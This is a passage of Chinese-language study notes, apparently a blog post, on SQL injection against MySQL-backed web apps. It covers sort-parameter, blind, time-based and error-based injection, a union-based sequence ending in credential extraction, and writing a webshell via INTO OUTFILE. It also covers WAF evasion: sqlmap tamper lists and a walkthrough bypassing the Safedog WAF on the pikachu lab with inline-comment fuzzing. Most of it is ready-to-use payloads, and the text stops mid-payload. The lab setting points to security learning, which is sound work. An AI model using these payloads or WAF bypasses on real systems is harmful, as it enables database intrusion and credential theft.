bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?<span class="hljs-built_in">id</span>=1<span class="hljs-string">&#x27;and NULLIF(114,ascii(substr(user(),1,1))) or &#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>b <span class="hljs-comment"># 相等时不正常，不相等正常</span><br></code></pre></td></tr></table></figure><h2 id="排序注入"><a href="#排序注入" class="headerlink" title="排序注入"></a>排序注入</h2><ul><li><p>order by是排序 因此关注web的排序功能点 重点找asc desc参数</p><ul><li>select * from 表名 order by 列名(或者数字) asc；升序(默认升序)</li><li>select * from 表名 order by 列名(或者数字) desc；降序</li></ul></li><li><p>常规的sql防御是参数化查询 但是asc desc是无法参数化的 一般开发会使用拼接方式连接语句 容易产生注入点</p></li><li><p>可以根据列名或者数字来进行排序</p></li><li><p>在排序语句后面添加我们想执行的语句</p></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">sort</span>=1 ASC ,<span class="hljs-keyword">if</span>((<span class="hljs-attribute">1</span>=1),1,(select 1 <span class="hljs-keyword">from</span> information_schema.tables))<br></code></pre></td></tr></table></figure><ul><li><p>配合时间盲注或写脚本</p></li><li><p>可以直接时间盲注</p><ul><li>?sort&#x3D;if(1&#x3D;2,1,sleep(6))</li><li>延迟时间&#x3D;sleep(1)的秒数*所查询数据条数</li><li>写脚本的时候可以用timeout避免</li></ul></li><li><p>也可以基于if盲注 式子和上面提到的差不多</p><ul><li><p>if(表达式,1,(select id from information_schema.tables))</p></li><li><p>但这个没地方输出？？</p></li><li><p>if里面嵌套一个sleep</p></li></ul></li></ul><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(<span class="hljs-keyword">substr</span>(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">118</span>,<span class="hljs-number">0</span>,<span class="hljs-keyword">sleep</span>(<span class="hljs-number">5</span>)) <br></code></pre></td></tr></table></figure><ul><li><p>基于rand的盲注</p></li><li><p>order by rand(true)和order by rand(false)的排序是不同的</p></li><li><p>order by rand(ascii(mid((select database()),1,1))&gt;96)</p></li><li><p>报错注入</p><ul><li><p>?sort&#x3D;updatexml(1,if(1&#x3D;1,1,user()),1);#查询正常</p></li><li><p>?sort&#x3D;updatexml(1,if(1&#x3D;2,1,user()),1);#查询报错</p></li><li><p>?sort&#x3D;extractvalue(1,if(1&#x3D;1,1,user()));#查询正常</p></li><li><p>?sort&#x3D;extractvalue(1,if(1&#x3D;2,1,user()));#查询报错</p></li></ul></li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?sort=(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x5c</span>,floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><ul><li><p>导入导出函数（需要特定条件） secure-file-priv</p><ul><li>?sort&#x3D;1 into outfile “d:&#x2F;1.txt”</li></ul></li><li><p>上传网页马</p><ul><li>Into outtfile 文件地址 lines terminated by 0x(网马进行16进制转换)</li></ul></li></ul><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 列名或者数字(我们可控) <span class="hljs-keyword">desc</span><br>一般参数为sort、<span class="hljs-keyword">order</span>或sortname，有一个参数值为<span class="hljs-keyword">desc</span>或<span class="hljs-keyword">asc</span><br>一般测试的时候加一个特别大的数字来观察页面是否发生异常<br></code></pre></td></tr></table></figure><ul><li>如果是?sort&#x3D;xx 然后这个参数我们可控的话</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?sort=<span class="hljs-keyword">if</span>(<span class="hljs-number">114</span>=ascii(substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),id,username)<br></code></pre></td></tr></table></figure><ul><li><p>用上面这个方法盲注即可</p></li><li><p>也可以用case when等</p></li><li><p>也可以利用数据库报错</p></li></ul><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xquery">sort=<span class="hljs-keyword">case</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span><span class="hljs-built_in"> id</span> <span class="hljs-keyword">else</span> exp(<span class="hljs-number">710</span>) <span class="hljs-keyword">end</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">sort</span>=<span class="hljs-keyword">case</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span><span class="hljs-built_in"> id</span> <span class="hljs-keyword">else</span> cot(<span class="hljs-number">0</span>) <span class="hljs-keyword">end</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">sort</span>=<span class="hljs-keyword">case</span> <span class="hljs-number">1</span> <span class="hljs-keyword">when</span> <span class="hljs-number">1</span> <span class="hljs-keyword">then</span><span class="hljs-built_in"> id</span> <span class="hljs-keyword">else</span> power(<span class="hljs-number">2</span>,<span class="hljs-number">9999</span>) <span class="hljs-keyword">end</span><br>原理就是<span class="hljs-keyword">else</span>后面这个函数的值会特别大或者没有意义就会异常<br>注意<span class="hljs-keyword">when</span>后面要自己动手修改<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl">时间盲注也可以 不过很少用<br>还能用<span class="hljs-keyword">rand</span>注入<br><span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>=<span class="hljs-number">1</span>)<br><span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-number">1</span>=<span class="hljs-number">2</span>)<br><span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(<span class="hljs-number">114</span>=ascii(<span class="hljs-keyword">substr</span>(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)))<br>他们排序是不同的<br></code></pre></td></tr></table></figure><ul><li><p>有报错回显的话也是可以用报错函数的</p></li><li><p>联合查询用不了</p></li></ul><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>优先用floor，因为floor返回不限制长度，另外两个限制32位。</p><ul><li>报错方法集合</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">(<span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat(<span class="hljs-number">0x5c</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x5c</span>,floor(rand()*<span class="hljs-number">2</span>)) <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><pre><code class="hljs">- 此处rand()和rand(0)可以替换多尝试几次- group by要求对同一组的数据进行汇总 由于rand的随机性 每次执行的时候 floor(rand()*2)可能会产生不同的值(0或者1)，意味着某些记录在同一查询中会分到不同的组，进而引发mysql内部的错误机制。- concat是连接函数- floor是把浮点数转换为0或者1</code></pre><ul><li>函数版本限制</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,user(</span>),0x7e,<span class="hljs-title">database</span>())) #</span><br><span class="hljs-function"></span><br><span class="hljs-function">1&#x27; <span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=database()))) <span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema</span>=database() <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>))) <span class="hljs-meta">#</span><br><br><span class="hljs-number">1&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(user_id,<span class="hljs-number">0x7e</span>,first_name,<span class="hljs-number">0x3a</span>,last_name</span>) <span class="hljs-keyword">from</span> dvwa.users))) #</span><br></code></pre></td></tr></table></figure><h2 id="爆破顺序"><a href="#爆破顺序" class="headerlink" title="爆破顺序"></a>爆破顺序</h2><p>拿到全部数据库信息</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">schema_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p>拿到当前所在数据库库名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata<br></code></pre></td></tr></table></figure><p>拿到当前数据库所有表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p>拿到你所选择数据库中所选择表中的所有列名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema = <span class="hljs-string">&#x27;security&#x27;</span><br></code></pre></td></tr></table></figure><p>拿到特定数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(user_login,<span class="hljs-number">0x2d</span>,user_password) <span class="hljs-keyword">from</span> <span class="hljs-built_in">table_name</span><br></code></pre></td></tr></table></figure><h1 id="waf绕过"><a href="#waf绕过" class="headerlink" title="waf绕过"></a>waf绕过</h1><h2 id="判断waf品牌"><a href="#判断waf品牌" class="headerlink" title="判断waf品牌"></a>判断waf品牌</h2><ul><li><a href="https://www.wangan.com/p/11v71302b8c5ab87">https://www.wangan.com/p/11v71302b8c5ab87</a></li></ul><h2 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h2><p>利用中间件与mysql的处理差异绕过waf规则（asp+iis）</p><ul><li>%unicode等特性</li></ul><p>脏数据填充（post）</p><p>空白字符填充</p><p>注意 tamper脚本可以用多个 用逗号相隔即可</p><p>但是可能存在冲突 顺序是从左到右替换</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs vim">双写<br>大小写           randomcase.<span class="hljs-keyword">py</span><br>like替换=          equaltolike.<span class="hljs-keyword">py</span><br><span class="hljs-built_in">and</span> 等于&amp;&amp;、<span class="hljs-built_in">or</span> 等于 ||、not 等于 !、<span class="hljs-built_in">xor</span> 等于|<br>in、not in<br>等效函数替换<br>用/**/分割SQL关键字      randomcomments.<span class="hljs-keyword">py</span><br>base64             base64encode.<span class="hljs-keyword">py</span><br>二次url编码         chardoubleeencode.<span class="hljs-keyword">py</span><br>一次url编码         charencode.<span class="hljs-keyword">py</span><br>过滤大于号         greatest.<span class="hljs-keyword">py</span><br>过滤大于号、等号        between.<span class="hljs-keyword">py</span><br>过滤空格、等于号        bluecoat.<span class="hljs-keyword">py</span>(not <span class="hljs-keyword">all</span>)<br>过滤小于号<br>过滤单引号         apostrophemask.<span class="hljs-keyword">py</span><br>过滤双引号         escapequotes.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><p>常用的tamper组合</p><p>仅mysql部分测试过可用 其余部分未测试 <a href="https://pingmaoer.github.io/2019/06/24/sqlmap-tamper%E8%AF%A6%E8%A7%A3/">https://pingmaoer.github.io/2019/06/24/sqlmap-tamper%E8%AF%A6%E8%A7%A3/</a></p><ul><li>mssql</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 、">tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,percentage,randomcase,,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes<br></code></pre></td></tr></table></figure><ul><li>mysql</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">tamper</span>=between,bluecoat,charencode,concat2concatws,equaltolike,greatest,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,randomcase,,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor<br></code></pre></td></tr></table></figure><ul><li>oracle</li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">tamper=between,charencode,equaltolike,greatest,multiplespaces,,randomcase,,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes,xforwardedfor<br></code></pre></td></tr></table></figure><ul><li>access</li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,,percentage,randomcase,,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords<br></code></pre></td></tr></table></figure><ul><li>postgresql</li></ul><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,,percentage,randomcase,,space2comment,space2plus,space2randomblank,xforwardedfor<br></code></pre></td></tr></table></figure><ul><li>对引号转义或者过滤</li></ul><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">如果是GBK可以尝试宽字节注入<br><span class="hljs-built_in">%df</span><br>BINARY 十六进制值<br>CONCAT(CHAR(<span class="hljs-keyword">ASCII</span>码值),CHAR(<span class="hljs-keyword">ASCII</span>码值))<br>char(<span class="hljs-keyword">ASCII</span>码值,<span class="hljs-keyword">ASCII</span>码值,<span class="hljs-keyword">ASCII</span>码值,<span class="hljs-keyword">ASCII</span>码值)<br></code></pre></td></tr></table></figure><ul><li><p>字符过滤</p><ul><li>过滤&#x3D;</li></ul></li></ul><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">使用&lt; &gt; <span class="hljs-built_in">regexp</span>(正则匹配字符串) like rlike <span class="hljs-built_in">Between</span>(a and b) <br></code></pre></td></tr></table></figure><ul><li>过滤逗号</li></ul><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">原式:<span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> ((<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AS</span> a) <span class="hljs-keyword">AS</span> t1 <span class="hljs-keyword">JOIN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">2</span> <span class="hljs-keyword">AS</span> b) <span class="hljs-keyword">AS</span> t2 <span class="hljs-keyword">JOIN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">3</span> <span class="hljs-keyword">AS</span> c) <span class="hljs-keyword">AS</span> t3)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">?id=1&#x27; UNION <span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">AS</span> a) <span class="hljs-keyword">AS</span> t1 <span class="hljs-keyword">JOIN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">2</span> <span class="hljs-keyword">AS</span> b) <span class="hljs-keyword">AS</span> t2 <span class="hljs-keyword">JOIN</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">3</span> <span class="hljs-keyword">AS</span> c) <span class="hljs-keyword">AS</span> t3 <span class="hljs-keyword">WHERE</span> <span class="hljs-string">&#x27;a&#x27;</span> RLIKE <span class="hljs-string">&#x27;b</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">substr(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)等价于substr((<span class="hljs-keyword">user</span>()) <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>) <br></code></pre></td></tr></table></figure><ul><li><p>注意上面有一个是得闭合的</p></li><li><p>过滤空格</p></li></ul><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">+ %00 %0A <span class="hljs-comment">/**/</span> ()<br></code></pre></td></tr></table></figure><ul><li>过滤or and</li></ul><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">and </span>= &amp;&amp;、<span class="hljs-keyword">or </span>= <span class="hljs-title">||</span>、<span class="hljs-keyword">xor </span>= <span class="hljs-title">|、not = !</span><br></code></pre></td></tr></table></figure><h2 id="安全狗绕过（mysql）"><a href="#安全狗绕过（mysql）" class="headerlink" title="安全狗绕过（mysql）"></a>安全狗绕过（mysql）</h2><p>主要利用内敛注释的fuzz和换行符进行绕过</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs sql">单行注释<span class="hljs-comment">--+内容</span><br>代表注释<span class="hljs-comment">--+之后的一行内容</span><br>eg.<br><span class="hljs-keyword">GET</span> <span class="hljs-operator">/</span><span class="hljs-keyword">sql</span><span class="hljs-operator">/</span>Less<span class="hljs-number">-1</span><span class="hljs-operator">/</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;and+1=2--+</span><br><span class="hljs-string">单行注释#</span><br><span class="hljs-string">与上面相同 不同点是不需要用空格隔开</span><br><span class="hljs-string">eg.</span><br><span class="hljs-string">GET /sql/Less-1/?id=1&#x27;</span><span class="hljs-keyword">and</span><span class="hljs-operator">+</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">%</span><span class="hljs-number">23</span><br>多行注释<span class="hljs-comment">/**/</span><br>从<span class="hljs-comment">/*开始 到*/</span>介绍 中间的所有内容都为注释内容 可以跨任意行<br>但是<span class="hljs-comment">/*后面不能紧跟着! 否则会被解释为内敛注释</span><br><span class="hljs-comment">eg.</span><br><span class="hljs-comment">GET /sql/Less-1/?id=1&#x27;/*waddwadd*/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/*waddwadd*/</span><span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">/*waddwadd*/</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">内敛注释/*! */</span><br><span class="hljs-string">里边的内容会被mysql解析 分为两种情况</span><br><span class="hljs-string">/*!紧跟着版本号：当目前的mysql版本大于指定的版本号的时候，内容会被解析，否则当为注释处理</span><br><span class="hljs-string"></span><br><span class="hljs-string">eg.</span><br><span class="hljs-string">GET /sql/Less-1/?id=1&#x27;</span><span class="hljs-comment">/*!10000and+sleep(5)*/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/*waddwadd*/</span><span class="hljs-number">1</span><span class="hljs-comment">/*waddwadd*/</span>o<br>这里mysql版本号大于<span class="hljs-number">1.0</span><span class="hljs-number">.0</span> 即可执行sleep(<span class="hljs-number">5</span>)语句<br><br><span class="hljs-comment">/*!不紧跟着版本号：正常解析</span><br><span class="hljs-comment">eg.</span><br><span class="hljs-comment">GET /sql/Less-1/?id=1&#x27;/*!and+sleep(5)*/</span><span class="hljs-keyword">and</span><span class="hljs-comment">/*waddwadd*/</span><span class="hljs-number">1</span><span class="hljs-comment">/*waddwadd*/</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="换行符"><a href="#换行符" class="headerlink" title="换行符"></a>换行符</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">%0a<br>相当于换行 不会影响sql语句正常执行<br>eg.<br><span class="hljs-built_in">GET</span> /sql/Less-1/?<span class="hljs-attribute">id</span>=1&#x27;and+1+and+%0<br></code></pre></td></tr></table></figure><h3 id="绕过手法-1"><a href="#绕过手法-1" class="headerlink" title="绕过手法"></a>绕过手法</h3><p>对于安全狗来说直接用内敛注释去fuzz可用的组合加上%0a穿插其中即可完成绕过</p><p>判断是否存在注入</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-attribute">name</span>=1&#x27;<br><span class="hljs-built_in">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-attribute">name</span>=1&#x27;&#x27;<br>看回显即可 大部分注入都能这么判断 少部分可能得用时间盲注判断<br>不过大多数人更喜欢用<br><span class="hljs-built_in">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-attribute">name</span>=1+and+1=1--+这么去判断 虽然看着更准确 但实际上容易触发waf规则 <br></code></pre></td></tr></table></figure><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20250311102546083-5832854.png" alt="image-20250311102546083"></p><p>这里直接触发waf了</p><p>尝试换行符不起作用 直接送到爆破模块去fuzz内敛注释的组成</p><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20250311102648994-5832854.png" alt="image-20250311102648994"></p><p>这里随便找了个</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-attribute">name</span>=kobe&#x27;and/*/!/*/1--+<br></code></pre></td></tr></table></figure><p>即可绕过waf规则</p><p>由于是靶场 直接尝试是否能union注入 先用order by 或者 group by判断列数</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-attribute">name</span>=kobe&#x27;order/*/!/*/by+2--+<br></code></pre></td></tr></table></figure><p>没触发waf 判断出来应该是两个列的回显位</p><p>直接尝试union select 是否可回显</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-attribute">name</span>=kobe&#x27;union/*/!/*select+1,2--+<br></code></pre></td></tr></table></figure><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20250311103116972-5832854.png" alt="image-20250311103116972"></p><p>但是发现被waf检测到了</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">GET</span> /pikachu/vul/sqli/sqli_str.php?<span class="hljs-attribute">name</span>=kobe&#x27;union/*/&lt;%/*/select+1,2--+<br></code></pre></td></tr></table></figure><p>fuzz了一下 发现可回显 直接构造函数查询database()</p><p><img src="/../image/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/image-20250311103636823-5832854.png" alt="image-20250311103636823"></p><p>用同样的内敛注释 并没有触发waf规则</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">GET <span class="hljs-regexp">/pikachu/vul/sqli/sqli_str.php?name=kobe&#x27;union/</span>*<span class="hljs-regexp">/&lt;%/</span>*<span class="hljs-regexp">/select+2,table_name/</span>*<span class="hljs-regexp">/&lt;%/</span>*<span class="hljs-regexp">/from/</span>*<span class="hljs-regexp">/&lt;%/</span>*/information_schema.tables--+<br></code></pre></td></tr></table></figure><p>用这个payload 发现还是触发waf规则了 尝试删减查看 发现是information_schema这个关键字被waf检测到了</p><p>尝试绕过 无果 只能用–+配合%0a去绕过</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">GET /pikachu/vul/sqli/sqli_str.php?name<span 